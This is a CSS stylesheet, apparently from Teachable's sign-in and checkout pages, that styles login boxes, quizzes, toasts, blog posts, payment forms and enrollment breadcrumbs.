.checkout-button-group.active .product-enroll { display: block; margin: 10px auto auto; font-style: normal; }

@media screen and (max-width: 767px) {
  .checkout-button-group .product-radio { float: left; }
  .checkout-button-group .product-details { padding-bottom: 5px; border: 0px; }
  .checkout-button-group .product-name, .checkout-button-group .description, .checkout-button-group .detailed-description { margin-left: 33px !important; }
  .checkout-button-group .product-price { padding: 20px; font-size: 14px; }
  .checkout-button-group .product-price .btn { height: 40px; width: 100%; font-size: 18px !important; }
}

.progressbar { width: 100%; border-radius: 99px; margin-top: 15px; text-align: right; font-size: 0.7em; height: 8px; line-height: 40px; padding: 0px; background: var(--gravel); }

.progressbar .progressbar-fill { float: left; border-radius: 99px; text-align: left; height: 8px; background: rgb(30, 166, 154); }

.content-box { background: var(--clinical); border-radius: 6px; padding: 30px 45px; position: relative; text-align: left; width: 100%; margin-bottom: 70px; }

.content-box h1 { color: var(--slate); padding-bottom: 22px; font-size: 20px; text-align: center; font-weight: 700; line-height: 28px; }

.content-box h1.no-padding { padding-bottom: 0px; }

.content-box h1.left-align { text-align: left; }

.content-box i.fa.fa-check { background: var(--money); border-radius: 50%; padding: 8px; font-size: 12px; color: var(--clinical); vertical-align: 5px; margin-right: 5px; }

.content-box.extra-top-padding { padding-top: 255px; }

.content-box .agree-to-terms { display: flex; font-size: 11px; line-height: 20px; }

.content-box .agree-to-terms input[type="checkbox"] { margin-right: 8px; }

.content-box .button-group { margin-top: 45px; display: block; }

.content-box .control-input { font-size: 13px; line-height: 21px; }

.content-box .control-input .img-circle { float: left; width: 45px; margin-right: 17px; }

.content-box .form-group { margin-bottom: 20px; }

.content-box .field_with_errors { display: inline; }

.content-box .field_with_errors .form-control, .content-box .field_with_errors select.form-control { box-shadow: 0px 1px 1px 0px var(--rose); background: var(--subtle); }

.content-box p { display: block; line-height: 21px; font-size: 14px; color: var(--slate); padding-bottom: 12px; }

.content-box p.description { text-align: center; margin-top: 0px; }

.content-box .avatar { border-radius: 50%; margin: 15px auto 30px; }

.content-box .form-control, .content-box select.form-control { background: transparent; border: 1px solid var(--magic); color: var(--squid-ink); box-shadow: none; }

.content-box .form-control:focus, .content-box select.form-control:focus { outline: 0px; border: 1px solid var(--magic); box-shadow: rgba(0, 0, 0, 0.075) 0px 1px 1px inset, rgba(102, 175, 233, 0.6) 0px 0px 8px; }

.content-box .form-control[disabled], .content-box .form-control[disabled]:focus, .content-box .form-control[readonly], .content-box .form-control[readonly]:focus, .content-box select.form-control[disabled], .content-box select.form-control[disabled]:focus, .content-box select.form-control[readonly], .content-box select.form-control[readonly]:focus { box-shadow: none !important; background-color: var(--subtle)  !important; }

.content-box .alert { font-size: 13px; font-weight: 600; border-radius: 4px; margin-bottom: 30px; border: 0px; padding-bottom: 13px; }

.content-box .alert.alert-danger, .content-box .alert.alert-danger p { color: var(--red-herring); background-color: var(--blush); }

.content-box .alert p { font-size: 12px; font-weight: 600; line-height: 17px; margin-bottom: -10px; }

.content-box .alert ul { padding-left: 20px; margin-top: 7px; }

.content-box .alert ul li { font-weight: normal; margin-top: 4px; font-size: 12px; margin-bottom: 3px; }

.content-box label { color: var(--plumette); font-size: 13px; font-weight: 500; line-height: 29px; }

.content-box label.description { color: var(--slate); font-size: 12px; line-height: 24px; }

.content-box label.description .highlight-text { color: var(--plumette); }

.content-box label.checkbox-label { font-size: 12px; color: var(--slate); width: 100%; font-weight: 400; line-height: 24px; }

.content-box label.checkbox-label input { margin-right: 6px; }

.content-box .link-below-button { font-size: 12px; color: var(--concrete); display: block; text-decoration: underline; margin-top: 10px; }

.content-box .link-below-button:hover { color: rgb(30, 166, 154); }

.content-box .g-recaptcha { width: 304px; height: 78px; margin-left: calc(50% - 152px); margin-top: 20px; }

.content-box.welcome-back-sso { text-align: center; }

.content-box.welcome-back-sso p { max-width: 400px; }

.content-box.welcome-back-sso .sso-profile-card { text-align: center; }

.content-box.welcome-back-sso .sso-profile-card img { padding: 5px; border: 1px solid var(--nebulous); }

.content-box.welcome-back-sso .sso-profile-card h3 { margin-top: 15px; line-height: 19px; font-size: 18px; color: var(--plumette); font-weight: 600; }

.content-box.welcome-back-sso .sso-profile-card p { font-size: 12px; color: var(--slate); font-weight: 500; line-height: 11px; margin-bottom: 14px; margin-left: auto; margin-right: auto; }

.content-box.welcome-back-sso .sso-continue-as-disclaimer { line-height: 15px; font-size: 11px; color: var(--nebulous); max-width: 300px; margin: 26px auto 12px; text-align: center; }

.content-box.welcome-back-sso .sso-continue-as-disclaimer-alert { text-align: center; border: 1px dashed var(--matcha); background: none; padding: 15px 30px; line-height: 21px; margin: auto; font-weight: normal; }

.content-box.welcome-back-sso .sso-continue-as-disclaimer-alert a { color: var(--money); text-decoration: underline; }

.content-box .box-footer { display: flex; -webkit-box-orient: horizontal; -webkit-box-direction: normal; flex-direction: row; -webkit-box-pack: center; justify-content: center; margin: 40px -45px -41px; height: auto; min-height: 80px; text-align: center; color: var(--nebulous); font-size: 13px; line-height: 70px; font-weight: 400; border-top: 1px solid var(--subtle); border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; }

.content-box .box-footer .box-full { width: 100%; }

.content-box .box-footer .box-full:hover, .content-box .box-footer .box-half:first-child:hover, .content-box .box-footer .box-half:last-child:hover { height: fit-content; background: var(--matcha); color: var(--clinical); }

.content-box .box-footer .box-half { width: 50%; float: left; line-height: 69px; text-align: center; }

.content-box .box-footer .box-half:first-child { border-right: 1px solid var(--subtle); }

.content-box .box-footer .box-half:first-child:hover { border-bottom-left-radius: 5px; }

.content-box .box-footer .box-half:last-child:hover { border-bottom-right-radius: 5px; }

.content-box .box-footer .box-half a { text-decoration: none; }

.content-box .box-footer a { font-weight: 600; font-size: 12px; color: var(--nebulous); }

.content-box .box-footer a img { margin-right: 10px; width: 20px; height: 20px; border-radius: 50%; vertical-align: -6px; }

.content-box .box-footer a:hover { color: var(--slate); }

.my-teachable-layout { font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; }

.my-teachable-layout .content-box { padding-top: 40px; padding-bottom: 40px; }

.my-teachable-layout .content-box .box-footer a { color: var(--matcha); }

.my-teachable-layout .content-box .box-footer a.box-half { color: var(--matcha); font-weight: 500; }

.my-teachable-layout .content-box .skip-wrapper { margin-top: 32px; text-align: center; }

.my-teachable-layout .content-box .skip-wrapper__link { cursor: pointer; }

.on-a-school-layout .content-box { margin-top: 70px; }

@media screen and (max-width: 767px) {
  .on-a-school-layout .content-box { margin-top: 0px; }
  .content-box { border: 0px; border-radius: 0px; box-shadow: none; width: calc(100% + 40px); margin: 0px 0px 0px -20px; }
  .content-box .checkout-sidebar { padding-top: 50px; padding-bottom: 0px; }
  .content-box .box-footer { background: var(--clinical); border-top: 1px solid var(--subtle); margin-bottom: 10px; -webkit-box-orient: vertical; -webkit-box-direction: normal; flex-direction: column; }
}

@media screen and (max-width: 992px) {
  .content-box .box-footer .box-half { height: fit-content; width: 100%; box-shadow: 0 10px 21px var(--subtle); background: var(--clinical); }
  .content-box .box-footer .box-half:first-child { border-right: 0px; border-bottom: 1px solid var(--subtle); }
  .content-box .box-footer .box-half:last-child { border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; }
}

.code-viewer-label { background: rgb(10, 10, 20); border-top-left-radius: 6px; border-top-right-radius: 6px; color: rgb(221, 221, 221); font-size: 11px; margin-bottom: -3px; padding: 0.5em 1em; text-transform: uppercase; }

.code-viewer code { white-space: pre; }

.code-viewer .hljs { padding: 0.5em 1em; }

.hljs { display: block; overflow-x: auto; padding: 0.5em; color: rgb(171, 178, 191); background: rgb(40, 44, 52); }

.hljs-comment, .hljs-quote { color: rgb(92, 99, 112); font-style: italic; }

.hljs-doctag, .hljs-keyword, .hljs-formula { color: rgb(198, 120, 221); }

.hljs-section, .hljs-name, .hljs-selector-tag, .hljs-deletion, .hljs-subst { color: rgb(224, 108, 117); }

.hljs-literal { color: rgb(86, 182, 194); }

.hljs-string, .hljs-regexp, .hljs-addition, .hljs-attribute, .hljs-meta-string { color: rgb(152, 195, 121); }

.hljs-built_in, .hljs-class .hljs-title { color: rgb(230, 192, 123); }

.hljs-attr, .hljs-variable, .hljs-template-variable, .hljs-type, .hljs-selector-class, .hljs-selector-attr, .hljs-selector-pseudo, .hljs-number { color: rgb(209, 154, 102); }

.hljs-symbol, .hljs-bullet, .hljs-link, .hljs-meta, .hljs-selector-id, .hljs-title { color: rgb(97, 174, 238); }

.hljs-emphasis { font-style: italic; }

.hljs-strong { font-weight: bold; }

.hljs-link { text-decoration: underline; }

@-webkit-keyframes fadeIn { 
  0% { opacity: 0; }
  100% { opacity: 1; }
}

@keyframes fadeIn { 
  0% { opacity: 0; }
  100% { opacity: 1; }
}

.Quiz { position: relative; }

.Quiz-item { left: 0px; position: absolute; top: 0px; transition: opacity 300ms ease 0s, transform 300ms ease 0s, -webkit-transform 300ms ease 0s; width: 100%; will-change: opacity, transform; }

.Quiz-item-enter-active { opacity: 0; transform: translate3d(10px, 0px, 0px); transition: none 0s ease 0s; }

.Quiz-item-exit-done, .Quiz-item-exit-active { opacity: 0; transform: translate3d(-10px, 0px, 0px); }

.Quiz-complete { animation: 750ms ease 0s 1 normal forwards running fadeIn; will-change: opacity; }

.Quiz .quiz-question-outer { transition: height 300ms ease 0s; }

.quiz-wrapper .quiz { max-width: 480px; margin: 0px auto; }

.quiz-wrapper .quiz .quiz-progress { text-align: center; margin-bottom: 20px; font-size: 20px; color: rgb(204, 204, 204); }

.quiz-wrapper .quiz .quiz-question { text-align: center; margin: 0px -50px 30px; font-size: 24px; }

.quiz-wrapper .quiz .quiz-question-outer { position: relative; }

.quiz-wrapper .quiz .quiz-answer-container.selected .quiz-answer { border: 1px solid rgb(215, 218, 218); color: rgb(0, 0, 0); background: var(--grey-area); }

.quiz-wrapper .quiz .quiz-answer-container .quiz-answer { background-color: white; overflow-wrap: break-word; border: 1px solid rgb(238, 238, 238); padding: 10px 20px; margin-bottom: 10px; border-radius: 5px; width: 100%; cursor: pointer; transition: all 0.1s ease-in-out 0s; color: rgb(129, 129, 129); }

.quiz-wrapper .quiz .quiz-answer-container .quiz-answer:hover { color: rgb(0, 0, 0); border: 1px solid var(--obsidian); }

.quiz-wrapper .quiz .quiz-answer-container .quiz-answer:focus { outline: none; border: 1px solid var(--obsidian); box-shadow: rgba(34, 34, 34, 0.1) 0px 0px 0px 5px; }

.quiz-wrapper .quiz .quiz-answer-container .quiz-answer-icon i { line-height: 40px; color: green; float: right; margin-top: -50px; margin-right: -30px; display: none; }

.quiz-wrapper .quiz .quiz-answer-container .quiz-answer-icon i.quiz-answer-icon-correct { color: rgb(46, 204, 113); }

.quiz-wrapper .quiz .quiz-answer-container .quiz-answer-icon i.quiz-answer-icon-incorrect { color: rgb(231, 76, 60); }

.quiz-wrapper .quiz.answered .quiz-answer-container .quiz-answer { cursor: default; }

.quiz-wrapper .quiz.answered .quiz-answer-container.correct .quiz-answer { border: 1px solid rgb(46, 204, 113); }

.quiz-wrapper .quiz.answered .quiz-answer-container.correct.selected .quiz-answer-icon-correct { display: block; color: rgb(46, 204, 113); }

.quiz-wrapper .quiz.answered .quiz-answer-container.selected.incorrect { color: rgb(231, 76, 60) !important; }

.quiz-wrapper .quiz.answered .quiz-answer-container.selected.incorrect .quiz-answer { border: 1px solid rgb(231, 76, 60) !important; }

.quiz-wrapper .quiz.answered .quiz-answer-container.selected.incorrect .quiz-answer-icon-incorrect { display: block; }

.quiz-wrapper .quiz.answered.multiple .quiz-answer-container.correct:not(.selected) .quiz-answer-icon-missed { display: block; color: rgb(46, 204, 113); }

.quiz-controls { margin-top: 30px; position: relative; }

.quiz-controls button:disabled { opacity: 0; }

.quiz-controls button { position: absolute; pointer-events: none; }

.quiz-controls button.pull-right { right: 0px; }

.quiz-controls button.half-opacity { cursor: default; opacity: 0.5; }

.quiz-controls button.is-visible { opacity: 1; pointer-events: auto; }

.quiz-controls button.is-visible.half-opacity { opacity: 0.5; }

.quiz-finished { margin-top: 32px; text-align: center; }

.quiz-finished i { font-size: 90px; margin-bottom: 20px; }

.quiz-finished i.success { color: rgb(46, 204, 113); }

.quiz-finished i.failure { color: rgb(231, 76, 60); }

.quiz-finished .quiz-finished-text { font-size: 22px; font-stretch: normal; font-style: normal; font-weight: normal; line-height: 2.05; text-align: center; }

.quiz-finished .quiz-finished-message { color: rgb(139, 139, 139); font-size: 18px; font-stretch: normal; font-style: normal; font-weight: normal; line-height: 1.67; text-align: center; }

.quiz-finished .btn-primary { font-size: 13px; font-stretch: normal; font-style: normal; font-weight: bold; line-height: 0.67; margin-top: 40px; min-width: 215px; text-align: center; padding: 14px 18px !important; }

@media screen and (max-width: 992px) {
  .quiz-wrapper .quiz .quiz-question { margin: 20px 0px; }
}

.student-referral { background-color: var(--linen); }

.student-referral__card { border: 1px solid var(--grey-area); background-color: var(--white); max-width: 56rem; width: 85%; }

.student-referral__button { background-color: var(--cornflower-blue); border-radius: 1.5rem; border: 1px solid var(--cornflower-blue); color: var(--white); height: 2.5rem; }

.lecture-tooltip { background-color: rgb(54, 65, 77); border-radius: 4px; color: rgb(255, 255, 255); font-size: 12px; font-stretch: normal; font-style: normal; font-weight: 600; left: 0px; line-height: 1.5; padding: 10px 15px; position: fixed; top: 0px; width: 90px; z-index: 10000; }

.lecture-tooltip.locked-complete-button { width: 226px; }

.lecture-tooltip .tooltip-content-arrow { border-left: 5px solid transparent; border-right: 5px solid transparent; border-bottom: 5px solid rgb(54, 65, 77); height: 0px; left: 50%; margin-left: -5px; position: absolute; top: -5px; width: 0px; }

.is-fetching[data-x-origin-download] { opacity: 0.5; cursor: progress; }

.toastWrapper { bottom: 0px; position: fixed; right: 0px; z-index: 100000; }

.toast { border-radius: 3px; padding-bottom: 10px; transition: transform 200ms ease 0s, -webkit-transform 200ms ease 0s; }

.toast[data-transition="entering"] { transform: translate3d(125%, 0px, 0px); }

.toast[data-transition="entered"] { transform: translate3d(0px, 0px, 0px); }

.toast[data-transition="exiting"] { transform: translate3d(125%, 0px, 0px); }

.toast.success { background-color: var(--obsidian); color: var(--white); }

.toast.error { background-color: var(--white); border: 1px solid var(--red-herring); color: var(--red-herring); }

.homepage-hero.blog { padding-top: 100px; padding-bottom: 40px; }

.homepage-hero.blog .headline a { color: rgb(255, 255, 255); }

.blog-container { background: rgb(242, 243, 243); padding-top: 10px; padding-bottom: 50px; }

.blog-container .post { background: rgb(255, 255, 255); padding: 30px; margin-top: 40px; border-top: 4px solid rgb(43, 54, 54); }

.blog-container .post .comments .attachment-block-label { display: none; }

.blog-container .post .comments__heading { margin-top: 50px; }

.blog-container .post.comments-wrapper { margin-top: 1px; }

.blog-container .post h1 { margin-top: 0px; margin-bottom: 20px; font-weight: 700; }

.blog-container .post h1 a { color: rgb(43, 54, 54); }

.blog-container .post h1 a:hover { color: black; }

.blog-container .post .post-share { float: right; margin-top: 5px; }

.blog-container .post .post-share a { background: rgb(232, 232, 232); text-align: center; height: 30px; width: 30px; display: block; float: left; line-height: 30px; padding: 0px; margin-right: 8px; border-radius: 50%; color: rgb(151, 151, 151); }

.blog-container .post .post-share a:hover { background: rgb(220, 220, 220); }

.blog-container .post .post-share a i { font-size: 20px; margin-top: 5px; }

.blog-container .post .post-byline img { border-radius: 50%; width: 42px; height: 42px; float: left; margin-right: 12px; }

.blog-container .post .post-byline .post-author-name { font-size: 16px; font-weight: 600; color: rgb(43, 54, 54); }

.blog-container .post .post-byline .post-date { color: rgb(124, 124, 124); }

.blog-container .post .post-content { margin-top: 20px; }

.blog-container .post .post-content p.read-more { margin-bottom: 0px; margin-top: 10px; }

.blog-container .post .post-content p.read-more a { border: 1px solid rgb(113, 113, 113); color: rgb(113, 113, 113); padding: 4px 7px; border-radius: 3px; font-size: 12px; font-weight: 600; }

.blog-container .post .post-content p.read-more a:hover { background: rgb(113, 113, 113); color: rgb(255, 255, 255); }

.blog-container .sidebar-block { background: rgb(255, 255, 255); margin-top: 40px; }

.blog-container .sidebar-block h2 { background: rgb(30, 166, 154); color: rgb(255, 255, 255); padding-left: 15px; padding-top: 9px; padding-bottom: 8px; font-size: 15px; font-weight: 600; }

.blog-container .sidebar-block .content { padding: 5px 20px 20px; }

.blog-container .sidebar-block .content p { line-height: 23px; padding-bottom: 0px; margin-bottom: 0px; font-size: 16px; }

.checkout-page { background: rgb(245, 246, 247); padding-bottom: 220px; }

.checkout-page .checkout-container { margin-top: 60px; }

.checkout-page .checkout-main-content { margin-top: 50px; }

.checkout-page .checkout-main-content h1 { padding-left: 5px; font-size: 19px; font-weight: 600; margin-top: 0px; margin-bottom: 20px; color: rgb(43, 54, 54); }

.checkout-page .checkout-sidebar { padding-top: 50px; padding-bottom: 50px; background-repeat: no-repeat; color: rgb(43, 54, 54); }

.checkout-page .checkout-sidebar.with-teachable-badge { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/badge-powered-by-teachable.svg"); background-position: 15px 1px; padding-top: 150px; background-size: 120px; }

.checkout-page .checkout-sidebar p, .checkout-page .checkout-sidebar ul li { font-size: 13px; line-height: 27px; font-weight: 400; color: rgb(88, 111, 111); }

.checkout-page .checkout-sidebar p.pitch { font-weight: 600; margin-bottom: 30px; font-size: 14px !important; line-height: 25px !important; }

.checkout-page .checkout-sidebar .list-heading { font-weight: 600; font-size: 14px; line-height: 28px; margin-bottom: 6px; margin-top: 0px; }

.checkout-page .checkout-sidebar ul.icon-list { list-style: none; margin-left: 7px; margin-top: 20px; margin-bottom: 0px; }

.checkout-page .checkout-sidebar ul.icon-list li { margin-bottom: 20px; line-height: 23px; color: rgb(117, 130, 150); }

.checkout-page .checkout-sidebar ul.icon-list li.one-click::before { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-one-click.svg"); }

.checkout-page .checkout-sidebar ul.icon-list li.ios-app::before { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-ios-app.svg"); background-size: 22px; }

.checkout-page .checkout-sidebar ul.icon-list li.lock::before { background-image: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-payment-secure.svg"); background-size: 28px; }

.checkout-page .checkout-sidebar ul.icon-list li::before { background-size: 24px; content: ""; display: inline-block; width: 28px; height: 34px; background-repeat: no-repeat; left: 23px; margin-top: 2px; position: absolute; }

.checkout-page .checkout-sidebar .checkout-sidebar-iframe { width: 350px; height: 100%; }

@media screen and (max-width: 900px) {
  .checkout-page .checkout-sidebar .checkout-sidebar-iframe { width: 100%; }
}

.checkout-page .price-adjustment { display: block; clear: both; margin-top: 20px; }

.checkout-page .price-adjustment .price-adjustment-link { margin-top: 20px; display: block; font-weight: 600; text-align: right; padding-left: 30px; }

.checkout-page .price-adjustment .price-adjustment-form { height: 20px; width: 100%; position: relative; margin-bottom: 60px; }

.checkout-page .price-adjustment .price-adjustment-form input.form-control { border-radius: 30px; padding-left: 20px; padding-right: 20px; float: left; height: 53px; width: 70%; line-height: 22px; }

@media screen and (max-width: 1199px) {
  .checkout-page .price-adjustment .price-adjustment-form input.form-control { width: 65%; }
}

@media screen and (max-width: 991px) {
  .checkout-page .price-adjustment .price-adjustment-form input.form-control { width: 55%; }
}

.checkout-page .payment-secure { font-size: 14px; color: rgb(117, 130, 150); font-weight: 500; line-height: 22px; padding-left: 5px; margin-bottom: 20px; }

.checkout-page .payment-secure img { margin-right: 10px; }

.checkout-page .billing-form .payment-methods { margin: -31px -46px 40px -45px; }

.checkout-page .billing-form .payment-methods .payment-method-tab { display: inline-block; margin-right: auto; margin-bottom: 0px; margin-left: auto; padding: 0px; line-height: 39px; min-height: 53px; text-align: center; border-bottom: 1px solid rgb(223, 223, 223); font-size: 15px; font-weight: bold; vertical-align: bottom; cursor: pointer; color: rgb(204, 204, 204); margin-top: 0px !important; }

.checkout-page .billing-form .payment-methods .payment-method-tab.checked { border-top: 2px solid rgb(30, 166, 154); min-height: 54px; border-bottom: 0px; }

.checkout-page .billing-form .payment-methods .payment-method-tab.checked .method-label { color: rgb(30, 166, 154); }

.checkout-page .billing-form .payment-methods .payment-method-tab.checked img { opacity: 1; }

.checkout-page .billing-form .payment-methods .payment-method-tab.cc { border-right: 1px solid rgb(223, 223, 223); }

.checkout-page .billing-form .payment-methods .payment-method-tab img { vertical-align: -5px; opacity: 0.6; }

.checkout-page .billing-form .payment-methods .payment-method-tab .custom-radio { display: inline-block; float: none; }

.checkout-page .billing-form .payment-methods .payment-method-tab .method-label { vertical-align: -7px; }

.checkout-page .billing-form .payment-methods .payment-method-tab .section-radio { padding-top: 10px; padding-bottom: 0px; line-height: 23px; margin-top: 10px; margin-bottom: 0px; }

.checkout-page .billing-form .payment-methods .payment-method-tab .section-radio.checked h4 { color: rgb(30, 166, 154); }

.checkout-page .billing-form .payment-methods .payment-method-tab .section-radio h4 { cursor: pointer; font-weight: bold; margin: -9px 0px 4px; line-height: 37px; }

.checkout-page .billing-form .payment-methods .payment-method-tab .section-radio .custom-radio { float: left; }

.checkout-page .billing-form .payment-form .current-cc { color: rgb(25, 148, 114); }

.checkout-page .billing-form .payment-form .current-cc .card-ends-in { font-size: 13px; font-weight: 600; color: green; margin-bottom: 0px; }

.checkout-page .billing-form .payment-form .current-cc .use-another-card { font-size: 15px; margin-bottom: -8px; }

.checkout-page .billing-form .payment-form .card-info .form-group { margin-bottom: 5px; }

.checkout-page .billing-form .payment-form .card-info.hidden { max-height: 0px; opacity: 0; margin-top: 0px; }

.checkout-page .billing-form .payment-form p { font-size: 15px; }

.checkout-page .billing-form .payment-form .cc-number { width: calc(100% - 150px); }

.checkout-page .billing-form .payment-form .saved-cc { font-weight: bold; }

.checkout-page .billing-form .payment-form .card-logos { position: absolute; right: 22px; top: 43px; }

.checkout-page .billing-form .payment-form .card-logos .center-button { text-align: center; }

.checkout-page .billing-form .payment-form #country-select { margin-bottom: 0px; }

.checkout-page .billing-form .payment-form a.action-link { text-decoration: underline; display: block; font-size: 13px; margin: 15px auto 8px; font-weight: bold; text-align: center; }

.checkout-page .half-width { width: 50%; }

.checkout-page .statement { padding: 10px; text-align: center; color: rgb(174, 174, 174); font-size: 12px; font-weight: 200; }

@media screen and (max-width: 767px) {
  .checkout-page .img-responsive { margin: auto auto 20px; }
  .checkout-page .checkout-sidebar.with-teachable-badge { background: none; padding-top: 60px; padding-bottom: 60px; }
}

.review-order-box { padding-top: 30px; padding-left: 30px; padding-right: 30px; }

.review-order-box .itemized-row { text-align: left; padding-bottom: 20px; margin-bottom: 20px; border-bottom: 1px solid rgb(238, 238, 238); }

.review-order-box .itemized-row .item-name { color: rgb(71, 80, 94); }

.review-order-box .itemized-row .field-value { text-align: right; }

.review-order-box .itemized-row .card-logos { line-height: 67px; }

.review-order-box .itemized-row .slash { margin: 6px auto auto; font-size: 24px; font-weight: 100; padding-left: 0px; padding-right: 0px; width: 10px; color: rgb(184, 184, 184); }

.review-order-box .itemized-row.discount { font-weight: 600; color: green; }

.review-order-box .itemized-row.discount .item-name { color: green; }

.review-order-box .itemized-row.additional-charge { color: rgb(162, 162, 162); }

.review-order-box .itemized-row.additional-charge .item-name { color: rgb(162, 162, 162); }

.review-order-box .total-row { padding-bottom: 0px; font-weight: 600; line-height: 17px; border-bottom: 0px; }

.review-order-box .total-row .item-name { text-transform: uppercase; color: rgb(71, 80, 94); }

.review-order-box .total-row .field-value { font-size: 14px; }

.review-order-box .box-footer { background: rgb(255, 255, 255); margin-top: 23px; margin-left: -30px; margin-right: -30px; padding: 20px 30px 25px; }

.checkout-breadcrumbs { height: 65px; margin-top: 60px; background: rgb(66, 82, 82); }

.checkout-breadcrumbs ol { color: white; margin: 20px 0px 0px; padding: 0px; height: 20px; font-size: 13px; list-style: none; position: relative; }

.checkout-breadcrumbs ol li { counter-increment: item 1; float: left; font-size: 12px; margin-right: 25px; opacity: 0.51; }

.checkout-breadcrumbs ol li::before { margin-top: 1px; margin-right: 15px; content: counter(item); border-radius: 100%; color: white; border: 1px solid white; width: 25px; height: 25px; font-weight: 600; padding-left: 0px; font-size: 12px; line-height: 23px; text-align: center; display: inline-block; }

.checkout-breadcrumbs ol li.current-step { color: white; opacity: 1; }

.checkout-breadcrumbs ol li.current-step::before { opacity: 1; background: white; color: rgb(43, 54, 54); border-color: white; }

.checkout-breadcrumbs ol li:first-child::after { margin-left: 19px; content: "›"; border-radius: 100%; color: rgba(255, 255, 255, 0.51); font-size: 19px; vertical-align: -2px; text-align: center; display: inline-block; }

.payment-errors { background: url("https://sso.teachable.com/secure/teachable_accounts/sign_in//assets.teachablecdn.com/icons/icon-card-error.svg") 19px 12px no-repeat rgb(255, 233, 233); color: rgb(213, 118, 118); border: 0.5px solid rgba(211, 111, 111, 0.44); border-radius: 4px; padding: 13px 20px 13px 60px; font-size: 14px; margin-bottom: 25px; font-weight: 600; }

.course-top-row.checkout-top { padding-top: 20px; padding-bottom: 20px; }

.course-top-row.checkout-top .course-header-container { padding-top: 0px !important; }

.course-top-row.checkout-top .course-header-container .course-title { line-height: 31px; padding-top: 6px; font-size: 27px !important; }

.course-top-row.checkout-top .course-header-container .course-subtitle { line-height: 22px; margin-top: 12px; font-size: 16px !important; margin-bottom: 0px !important; }

.course-top-row.checkout-top .course-header-container .course-price { color: rgb(30, 166, 154); font-weight: bold; font-size: 19px; margin-top: 15px; line-height: 20px; }

.course-top-row.checkout-top .course-header-container .course-price .discount { font-weight: normal; text-transform: uppercase; font-size: 13px; margin-left: 8px; color: rgb(173, 173, 173); }

.course-top-row.checkout-top .course-splash-media { margin-right: 0px !important; margin-bottom: 0px !important; }

.course-top-row.checkout-top .course-splash-media .img-responsive { margin-bottom: 5px; }

@media screen and (max-width: 991px) {
  .course-top-row.checkout-top .course-splash-media { margin-left: 33.3333%; }
}

.enrollment-step-indicator { border-radius: 33px; margin-top: 40px; height: 60px; }

.enrollment-step-indicator .current-step .step-name { opacity: 1 !important; }

.enrollment-step-indicator .current-step .step-number { background: rgb(255, 255, 255); opacity: 1 !important; }

.enrollment-step-indicator .step-1, .enrollment-step-indicator .step-2, .enrollment-step-indicator .step-3 { font-size: 19px; color: rgb(30, 166, 154); }

.enrollment-step-indicator .step-1 .step-name, .enrollment-step-indicator .step-2 .step-name, .enrollment-step-indicator .step-3 .step-name { opacity: 0.3; }

.enrollment-step-indicator .step-1 .step-number, .enrollment-step-indicator .step-2 .step-number, .enrollment-step-indicator .step-3 .step-number { text-align: center; background: none; margin-right: 7px; border-radius: 20px; width: 35px; height: 35px; float: none; display: inline-block; vertical-align: 0px; padding-top: 1px; border: 2px solid; opacity: 0.3; }

.enrollment-step-indicator .step-1.step-1, .enrollment-step-indicator .step-2.step-1, .enrollment-step-indicator .step-3.step-1 { text-align: left; }

.enrollment-step-indicator .step-1.step-2, .enrollment-step-indicator .step-2.step-2, .enrollment-step-indicator .step-3.step-2 { text-align: center; }

.enrollment-step-indicator .step-1.step-3, .enrollment-step-indicator .step-2.step-3, .enrollment-step-indicator .step-3.step-3 { text-align: right; }

@media screen and (max-width: 1199px) {
  .enrollment-step-indicator .step-1, .enrollment-step-indicator .step-2, .enrollment-step-indicator .step-3 { font-size: 16px !important; }
  .enrollment-step-indicator .step-1 .step-number, .enrollment-step-indicator .step-2 .step-number, .enrollment-step-indicator .step-3 .step-number { padding-top: 4px; }
}

#react-address-profile .billing_address_form .form_section > label span, #react-address-profile .shipping_address_form .form_section > label span { color: rgb(33, 35, 56) !important; }

#react-address-profile .billing_address_form .form_section > div, #react-address-profile .shipping_address_form .form_section > div { padding-left: 0px; border: none !important; box-shadow: none !important; }

.spc { background: rgb(245, 246, 247); color: rgb(54, 62, 72); font-weight: 600; padding-bottom: 220px; padding-top: 0px; transition: opacity 300ms ease 0s; }

.spc__breadcrumbs { -webkit-box-align: center; align-items: center; display: flex; margin-top: 60px; }

@media (max-width: 399px) {
  .spc__breadcrumbs { padding-bottom: 10px; padding-top: 10px; }
}

@media (min-width: 400px) {
  .spc__breadcrumbs { height: 65px; }
}

.spc__breadcrumbs-inner { padding: 0px 30px; }

.spc__breadcrumbs-list { margin: 0px; padding: 0px; }

.spc__breadcrumbs-item { display: inline-block; }

.spc__breadcrumbs-item::before { border: 1px solid white; border-radius: 50%; content: ""; display: inline-block; height: 30px; line-height: 30px; margin-right: 10px; text-align: center; width: 30px; }

.spc__breadcrumbs-item:nth-child(1)::before { content: "1"; }

.spc__breadcrumbs-item:nth-child(2)::before { background-color: white; color: black; content: "2"; }

.spc__breadcrumbs-item:nth-child(1) { opacity: 0.5; }

@media (max-width: 399px) {
  .spc__breadcrumbs-item:nth-child(1) { margin-bottom: 10px; }
}

@media (min-width: 400px) and (max-width: 767px) {
  .spc__breadcrumbs-item { margin-right: 10px; }
}

@media (min-width: 768px) {
  .spc__breadcrumbs-item:nth-child(1)::after { content: ">"; display: inline-block; padding: 0px 20px; }
  .spc__breadcrumbs-item:nth-child(1) { margin-left: 0px; }
}

.spc__inner { padding-top: 40px; }

@media screen and (max-width: 767px) {
  .spc__inner { margin-right: 25px; }
}

.spc__section--review { margin-bottom: 30px; }

.spc__section--review .spc__box { padding-top: 34px; }

.spc__section--review .spc__summary-item { margin-bottom: 20px; }

.spc__section--review .spc__inline-form { margin-bottom: 25px; }

.spc__section--review .spc__row { border-bottom: 1px solid rgb(245, 246, 247); margin-bottom: 25px; }

.spc__section--review .spc__row--total { border-bottom: 0px; margin-bottom: 0px; }

.spc__section--review .spc__row--total .spc__summary-item { margin: 0px; }

.spc__section--terms { margin-top: 30px; }

.spc__section--terms label { font-size: 13px; font-weight: 500; }

